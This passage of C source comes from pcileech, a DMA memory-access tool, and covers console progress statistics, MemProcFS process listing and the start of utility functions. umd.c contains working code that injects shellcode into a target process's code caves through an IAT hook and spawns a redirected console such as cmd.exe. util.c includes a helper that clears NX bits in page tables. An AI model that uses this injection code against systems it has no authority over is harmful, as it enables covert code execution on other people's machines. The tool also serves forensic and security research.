    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    BOOL isMBs = qwSpeed >= 2048;
    if(ps->i.fIsFirstPrintCompleted) {
#ifdef WIN32
        hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
        consoleInfo.dwCursorPosition.Y -= ps->i.fMemMap ? 9 : 7;
        SetConsoleCursorPosition(hConsole, consoleInfo.dwCursorPosition);
#endif /* WIN32 */
#ifdef LINUX
        printf(ps->i.fMemMap ? "\033[9A" : "\033[7A"); // move cursor up 7/9 positions
#endif /* LINUX */
    }
    if(ps->i.fMemMap) {
        _PageStatPrintMemMap(ps);
    }
    if(ps->cPageTotal < 0x0000000fffffffff) {
        printf(
            " Current Action: %s                             \n" \
            " Access Mode:    %s                             \n" \
            " Progress:       %llu / %llu (%llu%%)           \n" \
            " Speed:          %llu %s                        \n" \
            " Address:        0x%016llX                      \n" \
            " Pages read:     %llu / %llu (%llu%%)           \n" \
            " Pages failed:   %llu (%llu%%)                  \n",
            ps->szAction,
            ps->fKMD ? "KMD (kernel module assisted DMA)" : "Normal                          ",
            (ps->cPageSuccess + ps->cPageFail) / 256,
            ps->cPageTotal / 256,
            qwPercentTotal,
            (isMBs ? qwSpeed >> 10 : qwSpeed),
            (isMBs ? "MB/s" : "kB/s"),
            ps->qwAddr,
            ps->cPageSuccess,
            ps->cPageTotal,
            qwPercentSuccess,
            ps->cPageFail,
            qwPercentFail);
    } else {
        printf(
            " Current Action: %s                             \n" \
            " Access Mode:    %s                             \n" \
            " Progress:       %llu / (unknown)               \n" \
            " Speed:          %llu %s                        \n" \
            " Address:        0x%016llX                      \n" \
            " Pages read:     %llu                           \n" \
            " Pages failed:   %llu                           \n",
            ps->szAction,
            ps->fKMD ? "KMD (kernel module assisted DMA)" : "Normal                          ",
            (ps->cPageSuccess + ps->cPageFail) / 256,
            (isMBs ? qwSpeed >> 10 : qwSpeed),
            (isMBs ? "MB/s" : "kB/s"),
            ps->qwAddr,
            ps->cPageSuccess,
            ps->cPageFail);
    }
    ps->i.fIsFirstPrintCompleted = TRUE;
}

VOID WINAPI _PageStatThreadLoop(_In_ PPAGE_STATISTICS ps)
{
    while(!ps->i.fThreadExit) {
        Sleep(100);
        if(ps->i.fUpdate) {
            ps->i.fUpdate = FALSE;
            _PageStatShowUpdate(ps);
        }
    }
    ExitThread(0);
}

VOID PageStatClose(_In_opt_ PPAGE_STATISTICS *ppPageStat)
{
    BOOL status;
    DWORD dwExitCode;
    if(!ppPageStat || !*ppPageStat) { return; }
    (*ppPageStat)->i.fUpdate = TRUE;
    (*ppPageStat)->i.fThreadExit = TRUE;
    while((status = GetExitCodeThread((*ppPageStat)->i.hThread, &dwExitCode)) && STILL_ACTIVE == dwExitCode) {
        SwitchToThread();
    }
    if(!status) {
        Sleep(200);
    }
    CloseHandle((*ppPageStat)->i.hThread);
    LocalFree(*ppPageStat);
    *ppPageStat = NULL;
}

_Success_(return)
BOOL PageStatInitialize(_Out_ PPAGE_STATISTICS *ppPageStat, _In_ QWORD qwAddrBase, _In_ QWORD qwAddrMax, _In_ LPSTR szAction, _In_ BOOL fKMD, _In_ BOOL fMemMap)
{
    PPAGE_STATISTICS ps;
    ps = *ppPageStat = LocalAlloc(LMEM_ZEROINIT, sizeof(PAGE_STATISTICS));
    if(!ps) { return FALSE; }
    ps->qwAddr = qwAddrBase;
    ps->cPageTotal = (qwAddrMax - qwAddrBase + 1) / 4096;
    ps->szAction = szAction;
    ps->fKMD = fKMD;
    ps->i.fMemMap = fMemMap;
    ps->i.qwTickCountStart = GetTickCount64();
    ps->i.hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_PageStatThreadLoop, ps, 0, NULL);
    return TRUE;
}

VOID PageStatUpdate(_In_opt_ PPAGE_STATISTICS pPageStat, _In_ QWORD qwAddr, _In_ QWORD cPageSuccessAdd, _In_ QWORD cPageFailAdd)
{
    if(!pPageStat) { return; }
    pPageStat->qwAddr = qwAddr;
    pPageStat->cPageSuccess += cPageSuccessAdd;
    pPageStat->cPageFail += cPageFailAdd;
    // add to memory map
    if(cPageSuccessAdd && (pPageStat->i.MemMapIdx < PAGE_STATISTICS_MEM_MAP_MAX_ENTRY - 1)) {
        if(!pPageStat->i.MemMapIdx || (qwAddr - (cPageSuccessAdd << 12)) != (pPageStat->i.MemMap[pPageStat->i.MemMapIdx].qwAddrBase + ((QWORD)pPageStat->i.MemMap[pPageStat->i.MemMapIdx].cPages << 12))) {
            pPageStat->i.MemMapIdx++;
            pPageStat->i.MemMap[pPageStat->i.MemMapIdx].qwAddrBase = qwAddr - (cPageSuccessAdd << 12);
        }
        pPageStat->i.MemMap[pPageStat->i.MemMapIdx].cPages += (DWORD)cPageSuccessAdd;
    }
    pPageStat->i.fUpdate = TRUE;
}

//-----------------------------------------------------------------------------
// SEARCH STATISTICS BELOW:
//-----------------------------------------------------------------------------

VOID StatSearch_ShowUpdate(_Inout_ PSTATISTICS_SEARCH ps)
{
    QWORD qwTickCountElapsed = max(1, GetTickCount64() - ps->i.qwTickCountStart);
    QWORD qwSpeed = (ps->ctxs->cbReadTotal / 1024) / qwTickCountElapsed;
    HANDLE hConsole;
    CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
    if(ps->i.fIsFirstPrintCompleted) {
#ifdef WIN32
        hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
        consoleInfo.dwCursorPosition.Y -= 8;
        SetConsoleCursorPosition(hConsole, consoleInfo.dwCursorPosition);
#endif /* WIN32 */
#ifdef LINUX
        printf("\033[8A"); // move cursor up 8 positions
#endif /* LINUX */
    }
    printf(
        " Current Action:  %s                    \n" \
        " PID:             %i                    \n" \
        " Min Address:     0x%llx                \n" \
        " Current Address: 0x%llx                \n" \
        " Max Address:     0x%llx                \n" \
        " MB Read:         %llu                  \n" \
        " MB/s:            %llu                  \n" \
        " Search hits:     %i                    \n",
        ps->szAction,
        ctxMain->cfg.dwPID,
        ps->ctxs->vaMin,
        ps->ctxs->vaCurrent,
        ps->ctxs->vaMax,
        ps->ctxs->cbReadTotal / (1024 * 1204),
        qwSpeed,
        ps->ctxs->cResult
    );
    ps->i.fIsFirstPrintCompleted = TRUE;
}

VOID WINAPI StatSearch_ThreadLoop(_In_ PSTATISTICS_SEARCH ps)
{
    while(!ps->i.fThreadExit) {
        Sleep(100);
        StatSearch_ShowUpdate(ps);
    }
    ExitThread(0);
}

/*
* Initialize the search statistics. This will also start displaying the search
* statistics on the screen asynchronously. Call StatSearchClose() to stop.
* -- ppStatSearch
* -- ctxs
* -- szAction
* -- return
*/
_Success_(return)
BOOL StatSearchInitialize(_Inout_ PSTATISTICS_SEARCH *ppStatSearch, _In_ PVMMDLL_MEM_SEARCH_CONTEXT ctxs, _In_ LPSTR szAction)
{
    PSTATISTICS_SEARCH ps;
    ps = *ppStatSearch = LocalAlloc(LMEM_ZEROINIT, sizeof(STATISTICS_SEARCH));
    if(!ps) { return FALSE; }
    ps->ctxs = ctxs;
    ps->szAction = szAction;
    ps->i.qwTickCountStart = GetTickCount64();
    ps->i.hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StatSearch_ThreadLoop, ps, 0, NULL);
    return TRUE;
}

/*
* Do one last update of the on-screen page statistics.
* -- ppStatSearch = ptr to the PSTATISTICS_SEARCH struct to close and free.
*/
VOID StatSearchClose(_In_opt_ PSTATISTICS_SEARCH *ppStatSearch)
{
    BOOL status;
    DWORD dwExitCode;
    if(!ppStatSearch || !*ppStatSearch) { return; }
    (*ppStatSearch)->i.fUpdate = TRUE;
    (*ppStatSearch)->i.fThreadExit = TRUE;
    while((status = GetExitCodeThread((*ppStatSearch)->i.hThread, &dwExitCode)) && STILL_ACTIVE == dwExitCode) {
        SwitchToThread();
    }
    if(!status) {
        Sleep(200);
    }
    CloseHandle((*ppStatSearch)->i.hThread);
    LocalFree(*ppStatSearch);
    *ppStatSearch = NULL;
}

```

`pcileech/statistics.h`:

```h
// statistics.h : definitions of statistics related functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __STATISTICS_H__
#define __STATISTICS_H__
#include "pcileech.h"
#include <vmmdll.h>

#define PAGE_STATISTICS_MEM_MAP_MAX_ENTRY    2048

typedef struct tdSTATISTICS_INTERNAL {
    BOOL fUpdate;
    BOOL fThreadExit;
    BOOL fMemMap;
    BOOL fIsFirstPrintCompleted;
    HANDLE hThread;
    WORD wConsoleCursorPosition;
    QWORD qwTickCountStart;
    QWORD MemMapIdx;
    QWORD MemMapPrintIdx;
    struct {
        QWORD qwAddrBase;
        DWORD cPages;
    } MemMap[PAGE_STATISTICS_MEM_MAP_MAX_ENTRY];
} STATISTICS_INTERNAL, *PSTATISTICS_INTERNAL;

typedef struct tdPAGE_STATISTICS {
    QWORD qwAddr;
    QWORD cPageTotal;
    QWORD cPageSuccess;
    QWORD cPageFail;
    BOOL fKMD;
    LPSTR szAction;
    STATISTICS_INTERNAL i;
} PAGE_STATISTICS, *PPAGE_STATISTICS;

typedef struct tdSTATISTICS_SEARCH {
    LPSTR szAction;
    PVMMDLL_MEM_SEARCH_CONTEXT ctxs;
    STATISTICS_INTERNAL i;
} STATISTICS_SEARCH, *PSTATISTICS_SEARCH;

/*
* Initialize the page statistics. This will also start displaying the page statistics
* on the screen asynchronously. PageStatClose must be called to stop this.
* -- ps = ptr to NULL pPageStat PageStatInitialize will initialize. Must be free'd with PageStatClose.
* -- qwAddrBase = the base address that the statistics will be based upon.
* -- qwAddrMax = the maximum address.
* -- szAction = the text shown as action.
* -- fKMD = is KMD mode.
* -- fPageMap = display read memory map when PageStatClose is called.
* -- return
*/
_Success_(return)
BOOL PageStatInitialize(_Out_ PPAGE_STATISTICS *ppPageStat, _In_ QWORD qwAddrBase, _In_ QWORD qwAddrMax, _In_ LPSTR szAction, _In_ BOOL fKMD, _In_ BOOL fMemMap);

/*
* Do one last update of the on-screen page statistics, display the read memory map if
* previously set in PageStatInitialize and stop the on-screen updates.
* -- pPageStat = ptr to the PPAGE_STATISTICS struct to close and free.
*/
VOID PageStatClose(_In_opt_ PPAGE_STATISTICS *ppPageStat);

/*
* Update the page statistics with the current address and with successfully and failed
* pages. Should not be called before PageStatInitialize and not after PageStatClose.
* This function must be used if the memory map should be shown; otherwise it's possible
* to alter the PPAGE_STATISTICS struct members directly.
* -- pPageStat = pointer to page statistics struct.
* -- qwAddr = new address (after completed operation).
* -- cPageSuccessAdd = number of successfully read pages.
* -- cPageFailAdd = number of pages that failed.
*/
VOID PageStatUpdate(_In_opt_ PPAGE_STATISTICS pPageStat, _In_ QWORD qwAddr, _In_ QWORD cPageSuccessAdd, _In_ QWORD cPageFailAdd);

/*
* Initialize the search statistics. This will also start displaying the search
* statistics on the screen asynchronously. Call StatSearchClose() to stop.
* -- ppStatSearch
* -- ctxs
* -- dwPID
* -- szAction
* -- return
*/
_Success_(return)
BOOL StatSearchInitialize(_Inout_ PSTATISTICS_SEARCH *ppStatSearch, _In_ PVMMDLL_MEM_SEARCH_CONTEXT ctxs, _In_ LPSTR szAction);

/*
* Do one last update of the on-screen page statistics.
* -- ppStatSearch = ptr to the PSTATISTICS_SEARCH struct to close and free.
*/
VOID StatSearchClose(_In_opt_ PSTATISTICS_SEARCH *ppStatSearch);

#endif /* __STATISTICS_H__ */

```

`pcileech/umd.c`:

```c
// umd.c : implementation related to various user-mode functionality supported
//         by MemProcFS / vmm.dll integration.
//
// (c) Ulf Frisk, 2019-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "umd.h"
#include <stdio.h>
#include "executor.h"
#include "util.h"
#include <vmmdll.h>
#include "vmmx.h"

int UmdCompare32(const void* a, const void* b)
{
    return *(int*)a - *(int*)b;
}

/*
* List all processes in the target system memory by using the MemProcFS integration.
*/
VOID Action_UmdPsList()
{
    QWORD i, cbProcInfo, cPIDs = 0x1000;
    PDWORD pdwPIDs = NULL;
    PVMMDLL_PROCESS_INFORMATION pProcInfo = NULL;
    // 1: Initialize MemProcFS/vmm.dll
    if(!(pdwPIDs = LocalAlloc(LMEM_ZEROINIT, (SIZE_T)(cPIDs * sizeof(DWORD))))) { goto fail; }
    if(!(pProcInfo = LocalAlloc(0, sizeof(VMMDLL_PROCESS_INFORMATION)))) { goto fail; }
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        goto fail;
    }
    // 2: List processes and iterate over result
    if(!VMMDLL_PidList(pdwPIDs, &cPIDs)) {
        printf("UMD: Failed list PIDs.\n");
    } else {
        qsort(pdwPIDs, (SIZE_T)cPIDs, sizeof(DWORD), UmdCompare32);
        for(i = 0; i < cPIDs; i++) {
            ZeroMemory(pProcInfo, sizeof(VMMDLL_PROCESS_INFORMATION));
            pProcInfo->magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
            pProcInfo->wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
            cbProcInfo = sizeof(VMMDLL_PROCESS_INFORMATION);
            if(VMMDLL_ProcessGetInformation(pdwPIDs[i], pProcInfo, (PSIZE_T)&cbProcInfo)) {
                printf("  %6i %s %s\n", pProcInfo->dwPID, pProcInfo->win.fWow64 ? "32" : "  ", pProcInfo->szName);
            }
        }
    }
    Vmmx_Close();
fail:
    LocalFree(pdwPIDs);
    LocalFree(pProcInfo);
}

/*
* Translate a virtual address into a physical address for a given process id (pid).
*/
VOID Action_UmdPsVirt2Phys()
{
    QWORD pa, cbProcInfo;
    VMMDLL_PROCESS_INFORMATION oProcInfo;
    // 1: Initialize MemProcFS/vmm.dll
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        return;
    }
    // 2: Retrieve process name and translate virtual to physical address
    ZeroMemory(&oProcInfo, sizeof(VMMDLL_PROCESS_INFORMATION));
    oProcInfo.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
    oProcInfo.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
    cbProcInfo = sizeof(VMMDLL_PROCESS_INFORMATION);
    if(!VMMDLL_ProcessGetInformation((DWORD)ctxMain->cfg.qwDataIn[0], &oProcInfo, (PSIZE_T)&cbProcInfo)) {
        printf("UMD: Failed retrieving information for PID: %lli\n", ctxMain->cfg.qwDataIn[0]);
        printf("     SYNTAX: pcileech psvirt2phys -0 <pid> -1 <virtual_address>\n");
        goto fail;
    }
    if(!VMMDLL_MemVirt2Phys((DWORD)ctxMain->cfg.qwDataIn[0], ctxMain->cfg.qwDataIn[1], &pa)) {
        printf("UMD: Failed translating address 0x%016llx for process %s (%lli)\n", ctxMain->cfg.qwDataIn[1], oProcInfo.szName, ctxMain->cfg.qwDataIn[0]);
        printf("     SYNTAX: pcileech psvirt2phys -0 <pid> -1 <virtual_address>\n");
        goto fail;
    }
    printf("%s (%lli) 0x%016llX (virtual) -> 0x%016llX (physical)\n", oProcInfo.szName, ctxMain->cfg.qwDataIn[0], ctxMain->cfg.qwDataIn[1], pa);
fail:
    Vmmx_Close();
}

// struct shared with wx64_umd_exec_c.c
typedef struct tdUMD_EXEC_CONTEXT_LIMITED {
    CHAR fCMPXCHG;
    CHAR fEnableConsoleRedirect;            // config value set by pcileech
    CHAR fThreadIsActive;
    CHAR fStatus;
    DWORD dwFlagsCreateProcessA;            // config value set by pcileech
    QWORD qwDEBUG;
    QWORD pInfoIn;
    QWORD pInfoOut;
    HANDLE hInWrite;
    HANDLE hOutRead;
    HANDLE hOutWriteCP;
    HANDLE hInReadCP;
    HANDLE hProcessHandle;
    struct {                                // config value set by pcileech
        QWORD CloseHandle;
        QWORD CreatePipe;
        QWORD CreateProcessA;
        QWORD CreateThread;
        QWORD GetExitCodeProcess;
        QWORD ReadFile;
        QWORD Sleep;
        QWORD WriteFile;
        QWORD LocalAlloc;
    } fn;
    CHAR szProcToStart[MAX_PATH];           // config value set by pcileech
} UMD_EXEC_CONTEXT_LIMITED, *PUMD_EXEC_CONTEXT_LIMITED;

/*
* A Basic Usermode shellcode injection technique leveraging read-only analysis
* functionality using the MemProcFS API to identify injection points and also
* functions that the injected shellcode uses.
* If all prerequisites are met then the MemProcFS API is used to write the
* shellcode into the virtual memory of a specific process (technically into
* the backing physical page if it's shared - so be careful!).
* Future plan is to expand in this injection functionality to make it easier
* to use and more like the more versatile KMD functionality...
*/
VOID UmdWinExec()
{
    BOOL result;
    LPSTR szModuleName;
    DWORD cbExec = 0;
    BYTE pbExec[0x500], pbPage[0x1000] = { 0 };
    DWORD i, dwPID, cSections;
    QWORD vaCodeCave = 0, vaWriteCave = 0;
    PIMAGE_SECTION_HEADER pSections;
    SIZE_T cbProcessInformation;
    VMMDLL_PROCESS_INFORMATION oProcessInformation = { 0 };
    VMMDLL_WIN_THUNKINFO_IAT oThunkInfoIAT = { 0 };
    UMD_EXEC_CONTEXT_LIMITED ctx = { 0 };
    QWORD qwTickCountLimit;
    CHAR szHookBuffer[MAX_PATH] = { 0 };
    LPSTR szHookModule, szHookFunction = NULL;
    //--------------------------------------------------------------------------
    // 1: Retrieve process PID and module/function to hook in the main executable IAT.
    //--------------------------------------------------------------------------
    dwPID = (DWORD)ctxMain->cfg.qwDataIn[0];
    Util_SplitString2(ctxMain->cfg.szHook, '!', szHookBuffer, &szHookModule, &szHookFunction);
    if(!dwPID || !szHookModule[0] || !szHookFunction[0]) {
        printf(
            "UMD: Required aguments are missing - Syntax is:                                \n" \
            "  -0 <pid> -1 <CreateFlags> -2 <ConRedir> -s <ProcessToSpawn> -hook <Module!Fn>\n" \
            "  Example:                                                                     \n" \
            "    pcileech UMD_WINX64_IAT_PSCREATE -0 654 -hook ADVAPI32.dll!RegCloseKey     \n" \
            "    -1 0x08000000 -2 1 -s c : \\windows\\system32\\cmd.exe                     \n");
        return;
    }
    //--------------------------------------------------------------------------
    // 2: Verify process and locate 'IAT inject', r-x 'code cave' and rw- 'config cave'.
    //--------------------------------------------------------------------------
    oProcessInformation.magic = VMMDLL_PROCESS_INFORMATION_MAGIC;
    oProcessInformation.wVersion = VMMDLL_PROCESS_INFORMATION_VERSION;
    cbProcessInformation = sizeof(VMMDLL_PROCESS_INFORMATION);
    if(!VMMDLL_ProcessGetInformation(dwPID, &oProcessInformation, &cbProcessInformation)) {
        printf("UMD: EXEC: Could not retrieve process for PID: %i\n", dwPID);
        return;
    }
    szModuleName = oProcessInformation.szName;
    result = VMMDLL_WinGetThunkInfoIATU(dwPID, szModuleName, szHookModule, szHookFunction, &oThunkInfoIAT);
    if(!result) {
        printf("UMD: EXEC: Could not retrieve hook for %s!%s in '%s'\n", szHookModule, szHookFunction, oProcessInformation.szName);
        return;
    }
    if(!oThunkInfoIAT.fValid || oThunkInfoIAT.f32) {
        printf("UMD: EXEC: Could not retrieve valid hook in 64-bit process.\n");
        return;
    }
    if(!VMMDLL_ProcessGetSectionsU(dwPID, szModuleName, NULL, 0, &cSections) || !cSections) {
        printf("UMD: EXEC: Could not retrieve sections #1 for '%s'\n", szModuleName);
        return;
    }
    pSections = (PIMAGE_SECTION_HEADER)LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
    if(!pSections || !VMMDLL_ProcessGetSectionsU(dwPID, szModuleName, pSections, cSections, &cSections) || !cSections) {
        printf("UMD: EXEC: Could not retrieve sections #2 for '%s'\n", szModuleName);
        return;
    }
    for(i = 0; i < cSections; i++) {
        if(!vaCodeCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(pbExec)))) {
            vaCodeCave = VMMDLL_ProcessGetModuleBaseU(dwPID, szModuleName) + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(pbExec);
            if(!VMMDLL_MemReadPage(dwPID, vaCodeCave & ~0xfff, pbPage)) {
                vaCodeCave = 0;     // read test failed!
            }
        }
        if(!vaWriteCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(ctx)))) {
            vaWriteCave += VMMDLL_ProcessGetModuleBaseU(dwPID, szModuleName) + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(ctx);
            if(!VMMDLL_MemReadPage(dwPID, vaWriteCave & ~0xfff, pbPage)) {
                vaWriteCave = 0;     // read test failed!
            }
        }
    }
    if(!vaCodeCave || !vaWriteCave) {
        if(!vaCodeCave) {
            printf("UMD: EXEC: Could not locate suitable code cave in '%s'\n", szModuleName);
        }
        if(!vaWriteCave) {
            printf("UMD: EXEC: Could not locate suitable write cave in '%s'\n", szModuleName);
        }
        return;
    }
    //------------------------------------------------
    // 3: Prepare Inject
    //------------------------------------------------
    // prepare shellcode (goes into r-x section)
    Util_ParseHexFileBuiltin("DEFAULT_WINX64_UMD_EXEC", pbExec, sizeof(pbExec), &cbExec);
    *(PQWORD)(pbExec + 0x08) = vaWriteCave;
    *(PQWORD)(pbExec + 0x10) = oThunkInfoIAT.vaFunction;
    // prepare configuration data (goes into rw- section)
    ctx.qwDEBUG = 0;
    ctx.fn.CloseHandle = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "CloseHandle");
    ctx.fn.CreatePipe = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "CreatePipe");
    ctx.fn.CreateProcessA = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "CreateProcessA");
    ctx.fn.CreateThread = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "CreateThread");
    ctx.fn.GetExitCodeProcess = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "GetExitCodeProcess");
    ctx.fn.LocalAlloc = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "LocalAlloc");
    ctx.fn.ReadFile = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "ReadFile");
    ctx.fn.Sleep = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "Sleep");
    ctx.fn.WriteFile = VMMDLL_ProcessGetProcAddressU(dwPID, "kernel32.dll", "WriteFile");
    strcpy_s(ctx.szProcToStart, MAX_PATH - 1, ctxMain->cfg.szInS);
    ctx.dwFlagsCreateProcessA = (DWORD)ctxMain->cfg.qwDataIn[1];
    ctx.fEnableConsoleRedirect = ctxMain->cfg.qwDataIn[2] ? 1 : 0;
    //------------------------------------------------
    // 4: Inject & Hook
    //------------------------------------------------
    printf("UMD: EXEC: Injecting code and configuration data into process %s\n", szModuleName);
    printf("           IAT Hook : %s!%s at 0x%llx [0x%llx]\n", szHookModule, szHookFunction, oThunkInfoIAT.vaThunk, oThunkInfoIAT.vaFunction);
    VMMDLL_MemWrite(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
    VMMDLL_MemWrite(dwPID, vaCodeCave, pbExec, sizeof(pbExec));
    VMMDLL_MemWrite(dwPID, oThunkInfoIAT.vaThunk, (PBYTE)&vaCodeCave, 8);
    //------------------------------------------------
    // 5: Wait for execution
    //------------------------------------------------
    printf("           Waiting for execution ...\n");
    qwTickCountLimit = GetTickCount64() + 15 * 1000;    // wait for 15s max
    while(TRUE) {
        if(qwTickCountLimit < GetTickCount64()) { break; }
        if(!VMMDLL_MemReadEx(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED), NULL, VMMDLL_FLAG_NOCACHE)) { break; }
        if(ctx.fStatus) { break; }
        Sleep(10);
    }
    if(!ctx.fStatus) {
        printf("           FAILED! Error or Timeout after 15s.\n");
    } else {
        Sleep(10);
        if(ctx.pInfoIn && ctx.pInfoOut) {
            VMMDLL_ConfigSet(VMMDLL_OPT_REFRESH_ALL, 0);     // force refresh - shellcode allocations may have updated virtual memory map (page tables).
            printf("           Succeeded - Connecting to console ...\n");
            Exec_ConsoleRedirect(ctx.pInfoIn, ctx.pInfoOut, dwPID);
        } else {
            printf("           Succeeded.\n");
        }
    }
    //------------------------------------------------
    // 6: Restore
    //------------------------------------------------
    printf("           Restoring...\n");
    ZeroMemory(pbExec, sizeof(pbExec));
    ZeroMemory(&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
    VMMDLL_MemWrite(dwPID, oThunkInfoIAT.vaThunk, (PBYTE)&oThunkInfoIAT.vaFunction, 8);
    Sleep(10);
    VMMDLL_MemWrite(dwPID, vaCodeCave, pbExec, sizeof(pbExec));
    VMMDLL_MemWrite(dwPID, vaWriteCave, (PBYTE)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
}

VOID ActionExecUserMode()
{
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("UMD: Failed initializing required MemProcFS/vmm.dll\n");
        return;
    }
    if(0 == _stricmp(ctxMain->cfg.szShellcodeName, "UMD_WINX64_IAT_PSEXEC")) {
        UmdWinExec();
    } else {
        printf("UMD: Not found.\n");
    }
    Vmmx_Close();
}

```

`pcileech/umd.h`:

```h
// umd.c : implementation related to various user-mode functionality supported
//         by the Memory Process File System / MemProcFS / vmm.dll integration.
//
// (c) Ulf Frisk, 2020-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __UMD_H__
#define __UMD_H__
#include "pcileech.h"

/*
* List all processes in the target system memory by using the MemProcFS integration.
*/
VOID Action_UmdPsList();

/*
* Translate a virtual address into a physical address for a given process id (pid).
*/
VOID Action_UmdPsVirt2Phys();

/*
* Execute user-mode code by injecting code into a user-mode process. This
* requires integration with the Windows-only MemProcFS/'vmm.dll'.
*/
VOID ActionExecUserMode();

#endif /* __UMD_H__ */

```

`pcileech/util.c`:

```c
// util.c : implementation of various utility functions.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "pcileech.h"
#include "util.h"
#include "device.h"
#include "shellcode.h"

#define PT_VALID_MASK       0x00000000000000BD    // valid, active, supervior paging structure
#define PT_VALID_VALUE      0x0000000000000021    //
#define PT_MASK_ENABLE      0x0000000000000001
#define PT_MASK_PS          0x0000000000000080
#define PT_MASK_NX          0x8000000000000000
#define PT_FLAG_HELPER_X    0x0000000000000001

_Success_(return)
BOOL Util_PageTable_Helper(_In_ QWORD qwVA, _In_ QWORD qwPgLvl, _In_ QWORD qwPgTblPA, _In_ QWORD qwTestMask, _In_ QWORD qwTestValue, _In_ QWORD fMode, _Out_ PQWORD pqwPTE, _Out_ PQWORD pqwPTEPA, _Out_ PQWORD pqwPgLvl)
{
    BOOL result;
    BYTE pb[4096];
    QWORD idx, pte;
    result = DeviceReadMEM(qwPgTblPA, 4096, pb, TRUE);
    if(!result) { return FALSE; }
    idx = 0xff8 & ((qwVA >> (qwPgLvl * 9 + 3)) << 3);
    pte = *(PQWORD)(pb + idx);
    if(!(pte & PT_MASK_ENABLE)) { return FALSE; }
    if((pte & qwTestMask) != qwTestValue) { return FALSE; }
    if((fMode & PT_FLAG_HELPER_X) && (pte & PT_MASK_NX)) {
        *(PQWORD)(pb + idx) &= 0x7fffffffffffffff;
        DeviceWriteMEM(qwPgTblPA + idx, 8, pb + idx, FALSE);
    }
    if((qwPgLvl == 1) || (pte & PT_MASK_PS)) {
        *pqwPgLvl = qwPgLvl;
        *pqwPTE = pte;
        *pqwPTEPA = qwPgTblPA + idx;
        return TRUE;
    }
    qwPgTblPA = pte & 0x0000fffffffff000;
    if(!qwPgTblPA) { return FALSE; }
    return Util_PageTable_Helper(qwVA, qwPgLvl - 1, qwPgTblPA, qwTestMask, qwTestValue, fMode, pqwPTE, pqwPTEPA, pqwPgLvl);
}

BOOL Util_PageTable_ReadPTE(_In_ QWORD qwCR3, _In_ QWORD qwAddressLinear, _Out_ PQWORD pqwPTE, _Out_ PQWORD pqPTEAddrPhys)
{
    QWORD ptePgLvl;
    return Util_PageTable_Helper(qwAddressLinear, 4, qwCR3, PT_VALID_MASK, PT_VALID_VALUE, 0, pqwPTE, pqPTEAddrPhys, &ptePgLvl);
}

BOOL Util_PageTable_SetModeX(_In_ QWORD qwCR3, _In_ QWORD qwAddressLinear)
{
    QWORD pte, pteVA, ptePgLvl;
    return Util_PageTable_Helper(qwAddressLinear, 4, qwCR3, 0, 0, PT_FLAG_HELPER_X, &pte, &pteVA, &ptePgLvl);
}

BOOL Util_PageTable_FindSignatureBase_IsPageTableDataValid(_In_ QWORD qwPageTableData)
{
    if((qwPageTableData & PT_VALID_MASK) != PT_VALID_VALUE) {
        return FALSE; // Not valid supervisor page entry
    }
    qwPageTableData &= 0x0000fffffffff000;
    if(qwPageTableData == 0) {
        return FALSE; // Not found
    }
    if(qwPageTableData > 0xffffffff) {
        return FALSE; // Outside 32-bit scope
    }
    if(qwPageTableData > 0xc0000000) {
        return FALSE; // Possibly in PCIE space
    }
    return TRUE;
}

_Success_(return)
BOOL Util_PageTable_FindSignatureBase_CachedReadMEM(_In_ QWORD qwAddr, _Out_writes_(0x1000) PBYTE pbPage, _Inout_updates_bytes_opt_(0x01000000) PBYTE pbCache)
{
    BOOL result;
    if(pbCache) {
        if(*(PQWORD)pbCache == 0) {
            *(PQWORD)pbCache = 2;
            result = DeviceReadMEM(0x00100000, 0x00F00000, pbCache + 0x00100000, TRUE);
            if(!result) { return FALSE; }
            *(PQWORD)pbCache = 1;
        }
        if(*(PQWORD)pbCache == 1 && qwAddr >= 0x00100000 && qwAddr < 0x01000000) {
            memcpy(pbPage, pbCache + qwAddr, 4096);
            return TRUE;
        }
    }
